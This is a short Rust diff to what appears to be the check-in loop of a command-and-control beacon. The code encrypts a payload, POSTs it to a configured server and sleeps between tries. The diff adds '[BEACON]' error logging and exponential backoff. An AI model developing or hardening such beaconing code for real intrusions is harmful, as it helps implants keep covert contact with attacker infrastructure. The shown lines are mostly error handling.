@@ -120,20 +120,25 @@ pub fn run(config: Arc<Config>) {
         // 5. Encrypt
         let encrypted = match aes::encrypt(&payload_json, &config.aes_key) {
             Ok(e) => e,
-            Err(_) => {
-                std::thread::sleep(std::time::Duration::from_secs(config.get_sleep()));
+            Err(e) => {
+                eprintln!("[BEACON] Encrypt error: {}", e);
+                consecutive_errors += 1;
+                let backoff = std::cmp::min(config.get_sleep() * (1 << consecutive_errors), max_backoff);
+                std::thread::sleep(std::time::Duration::from_secs(backoff));
                 continue;
             }
         };
 
         // 6. POST to server
+        eprintln!("[BEACON] Syncing to {}", config.server_url);
         let response_encrypted = match https::sync_post(&config.server_url, &encrypted) {
             Ok(r) => {
                 consecutive_errors = 0;
                 r
             }
-            Err(_) => {
+            Err(e) => {
                 // Network error — exponential backoff
+                eprintln!("[BEACON] Sync error: {}", e);
                 consecutive_errors += 1;
                 let backoff = std::cmp::min(
                     config.get_sleep() * 2u64.pow(consecutive_errors.min(6)),
